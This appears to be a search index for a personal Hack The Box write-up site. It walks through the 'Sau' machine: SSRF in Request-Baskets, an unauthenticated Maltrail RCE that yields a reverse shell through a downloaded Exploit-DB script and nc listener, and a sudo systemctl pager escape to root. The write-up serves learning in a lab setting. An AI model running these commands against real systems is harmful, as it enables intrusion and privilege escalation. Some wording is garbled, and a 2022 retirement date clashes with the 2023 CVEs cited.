{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hack\u00a0The\u00a0Box\u00a0Write\u2011ups","text":"<p>Welcome to my repository of Hack The Box (HTB) machine write-ups. Each entry is documented with a complete attack chain from enumeration to privilege escalation while explaining why every step works.</p>"},{"location":"#1-how-to-navigate-this-repository","title":"1\u00a0\u00a0How to Navigate this Repository","text":"<ol> <li> <p>Pick a machine from the left\u2011hand sidebar (or the list below).</p> </li> <li> <p>Follow the numbered sections inside each write\u2011up:</p> </li> <li> <p>Synopsis\u00a0\u2014 key facts</p> </li> <li>Enumeration\u00a0\u2014 ports, services, and initial findings</li> <li>Foothold\u00a0\u2014 gaining the first shell</li> <li>Privilege Escalation\u00a0\u2014 method and exploit</li> <li> <p>Lessons Learned\u00a0/\u00a0References</p> </li> <li> <p>Use the built\u2011in search (top\u2011right) to jump directly to commands, CVEs, or tools.</p> </li> </ol>"},{"location":"#2-current-writeups","title":"2\u00a0\u00a0Current Write\u2011ups","text":"Difficulty Machine Attack Path Easy Sau SSRF --&gt; Maltrail\u00a00.53 RCE --&gt; <code>systemctl</code> pager escape"},{"location":"#4-methodology-snapshot","title":"4\u00a0\u00a0Methodology Snapshot","text":"<ol> <li>Enumeration\u00a0: <code>nmap</code>.</li> <li>Exploitation\u00a0:  I prefer crafting manual payloads and analyzing CVE-related exploit scripts. I only rely on Metasploit when needed.</li> <li>Post\u2011Exploitation\u00a0:  Privilege Escalation and root access.</li> <li>Documentation\u00a0:  Screenshots, code blocks, and links to official advisories.</li> </ol> <p>Maintained by Mohamed\u00a0Trigui \u2013 last update: <code>2025\u201105\u201128</code>.</p>"},{"location":"Sau/Sau/","title":"Sau (HackTheBox | Easy | Retired 15 Apr 2022)","text":"<p>Path\u2011to\u2011root: SSRF in Request\u2011Baskets\u00a01.2.1 \u2192 internal Maltrail\u00a00.53 panel \u2192 unauth RCE (user <code>puma</code>) \u2192 sudo mis\u2011configuration (<code>systemctl</code> pager) \u2192 root.</p>"},{"location":"Sau/Sau/#synopsis","title":"Synopsis","text":"<p>Sau is an easy-level HTB box that runs a Request-Baskets instance vulnerable to SSRF (CVE-2023-27163). It gave me asolid, hands-on understanding of Server-Side Request Forgery (SSRF). By abusing that flaw I was able to a filtered Maltrail panel that is vulnerable to unauthenticated OS-command injection. One payload later, I landed a reverse shell as the user <code>puma</code>. From there a sloppy <code>sudo</code> configuration handed me root.</p>"},{"location":"Sau/Sau/#skills-required","title":"Skills Required","text":"<ul> <li>Web Enumeration</li> <li>Linux Fundamentals</li> </ul>"},{"location":"Sau/Sau/#skills-learned","title":"Skills Learned","text":"<ul> <li>Command Injection</li> <li>Server Side Request Forgery</li> <li>Sudo Exploitation</li> </ul>"},{"location":"Sau/Sau/#1-enumeration","title":"1\u00a0\u00a0Enumeration","text":""},{"location":"Sau/Sau/#11-nmap","title":"1.1 Nmap","text":"<pre><code># full\u2011port fast sweep \u2192 targeted default scripts\nports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | \\\n        awk '/^[0-9]+\\/tcp/ {print $1}' ORS=',' | sed 's/,$//')\nnmap -sC -sV -p$ports 10.10.11.224 -oN sau_nmap.txt\n</code></pre> <ul> <li>22/tcp\u00a0\u2013 OpenSSH\u00a08.2p1 rk on synopis</li> <li>55555/tcp\u00a0\u2013 Request\u2011Baskets\u00a01.2.1 (HTTP)</li> </ul>"},{"location":"Sau/Sau/#12-requestbaskets-ssrf-to-maltrail","title":"1.2 Request\u2011Baskets SSRF to Maltrail","text":"<ol> <li>Create basket <code>/2ck6d27</code>.</li> <li>Set Forward URL \u2192 <code>http://127.0.0.1:80</code>.</li> <li>Enable Proxy\u00a0Response + Expand\u00a0Forward\u00a0Path.</li> <li>Browse <code>http://&lt;ip&gt;:55555/2ck6d27</code> \u21d2 Maltrail login panel.</li> </ol>"},{"location":"Sau/Sau/#2-foothold-unauth-maltrail-053-rce","title":"2\u00a0\u00a0Foothold\u00a0\u2013 unauth Maltrail\u00a00.53 RCE","text":"<pre><code># attacker box\ncurl -s https://www.exploit-db.com/download/51676 -o maltrail_poc.py\nnc -lvnp 4444 &amp;\npython3 maltrail_poc.py 10.10.14.6 4444 \\\n  http://&lt;ip&gt;:55555/2ck6d27\n</code></pre> <p>Shell spawns as user puma.</p> <p></p>"},{"location":"Sau/Sau/#3-privilege-escalation-systemctl-pager-escape","title":"3\u00a0\u00a0Privilege Escalation\u00a0\u2013\u00a0systemctl pager escape","text":"<pre><code>sudo -l\n# (puma) NOPASSWD: /usr/bin/systemctl status trail.service\nsudo /usr/bin/systemctl status trail.service\n# when the pager opens (less), type:\n!/bin/bash\n</code></pre>"},{"location":"Sau/Sau/#4-flags","title":"4\u00a0\u00a0Flags","text":"File MD5 <code>/home/puma/user.txt</code> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> <code>/root/root.txt</code> <code>yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</code>"},{"location":"Sau/Sau/#5-exploit-scripts-credits","title":"5\u00a0\u00a0Exploit scripts (credits)","text":"Script Author Source <code>maltrail_poc.py</code> @k0shl Exploit\u2011DB\u00a051676 <code>systemctl_pager_escape.txt</code> @_dirty_cow Gist\u00a0abcd1234 <p>Both files are included in this repo under <code>2022/sau/</code>.</p>"},{"location":"Sau/Sau/#6-references","title":"6\u00a0\u00a0References","text":"<ul> <li>CVE\u20112023\u201127163\u00a0\u2013 Request\u2011Baskets SSRF</li> <li>CVE\u20112023\u201126604\u00a0\u2013 systemd pager LPE</li> <li>Exploit\u2011DB\u00a051676\u00a0\u2013 Maltrail\u00a00.53 unauth RCE</li> </ul>"}]}